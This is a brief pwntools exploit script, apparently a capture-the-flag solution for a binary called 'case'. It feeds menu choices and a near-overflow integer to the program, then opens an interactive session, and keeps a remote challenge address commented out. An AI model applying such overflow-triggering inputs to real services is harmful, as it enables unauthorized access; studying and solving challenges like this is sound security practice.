from pwn import *

p = process('./case')
#p = remote('103.200.7.156',2101)
p.sendline('2')
p.sendline('2137483600')
p.sendline('1')
p.sendline('y')
p.interactive()